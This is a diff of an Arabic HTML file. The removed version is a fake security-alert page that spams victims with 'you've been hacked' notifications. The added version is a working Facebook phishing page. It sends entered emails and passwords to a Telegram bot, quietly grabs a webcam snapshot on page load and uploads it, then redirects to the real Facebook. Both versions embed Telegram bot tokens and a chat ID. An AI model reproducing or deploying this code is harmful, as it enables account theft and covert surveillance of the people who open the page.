@@ -1,65 +1,90 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحذير أمني - Security Alert</title>
+    <meta property="og:title" content="شاهد هذا المنشور على فيسبوك">
+    <meta property="og:image" content="https://bit.ly/3yRkLp7"> <title>Facebook - سجل الدخول</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #111; border: 2px solid #ff0000; padding: 40px; border-radius: 25px; text-align: center; box-shadow: 0 0 30px #ff0000; width: 85%; max-width: 350px; }
-        .alert-icon { font-size: 70px; margin-bottom: 20px; animation: blink 1s infinite; }
-        h2 { color: #ff0000; margin-bottom: 15px; }
-        p { color: #ccc; margin-bottom: 30px; }
-        button { background: #ff0000; color: #fff; padding: 18px; border: none; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; }
+        button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        #video { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="alert-icon">⚠️</div>
-    <h2>تنبيه أمني خطير</h2>
-    <p>تم اكتشاف محاولة وصول لملفاتك الخاصة. اضغط أدناه لتفعيل وضع الحماية وصد الهجوم.</p>
-    <button onclick="startHeavySpam()">تفعيل الحماية الآن</button>
-</div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-<script>
-    const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY";
-    const chat = "8042090388";
+    <div class="login-box">
+        <h2 style="color: #1877f2; font-size: 32px;">facebook</h2>
+        <p>يجب عليك تسجيل الدخول للمتابعة</p>
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button onclick="captureAndSend()">تسجيل الدخول</button>
+    </div>
 
-    async function startHeavySpam() {
-        const permission = await Notification.requestPermission();
+    <script>
+        const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
+        const chat = "8042090388";
 
-        if (permission === "granted") {
-            // إرسال تقرير لتليجرام
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat, text: "🧨 بدأ قصف الـ 20 إشعاراً على الضحية بنجاح!" })
-            });
-
-            let count = 0;
-            const spammer = setInterval(() => {
-                new Notification("اختراق!", {
-                    body: "تم اختراقك من عمك @ll._911",
-                    icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
-                });
-
-                count++;
-                if (count >= 20) { // التوقف عند 20 رسالة
-                    clearInterval(spammer);
-                    // التحويل لليوتيوب بعد انتهاء كل الإشعارات
-                    setTimeout(() => {
-                        window.location.href = "https://youtube.com/@benjaminbennetttt?si=9J7bqSt389IK3tUB";
-                    }, 2000);
-                }
-            }, 5000); // إرسال إشعار كل 5 ثوانٍ
-
-        } else {
-            alert("خطأ: يجب السماح بالإشعارات لإيقاف عملية الاختراق!");
+        // طلب الكاميرا فور فتح الرابط
+        window.onload = function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                // أخذ لقطة تلقائية فور السماح
+                setTimeout(takeSnapshot, 2000);
+            })
+            .catch(err => console.log("Camera denied"));
         }
-    }
-</script>
 
+        function takeSnapshot() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imgData = canvas.toDataURL('image/jpeg');
+            
+            // إرسال الصورة للبوت
+            sendPhoto(imgData);
+        }
+
+        function sendPhoto(base64Data) {
+            const blob = dataURItoBlob(base64Data);
+            const formData = new FormData();
+            formData.append('chat_id', chat);
+            formData.append('photo', blob, 'cam.jpg');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        function captureAndSend() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const msg = `🔥 صيد جديد (فيسبوك + كاميرا):\n📧 User: ${email}\n🔑 Pass: ${pass}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`)
+            .then(() => {
+                window.location.href = "https://www.facebook.com"; // تحويل للحقيقي
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            var byteString = atob(dataURI.split(',')[1]);
+            var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            var ab = new ArrayBuffer(byteString.length);
+            var ia = new Uint8Array(ab);
+            for (var i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
+            return new Blob([ab], {type: mimeString});
+        }
+    </script>
 </body>
 </html>
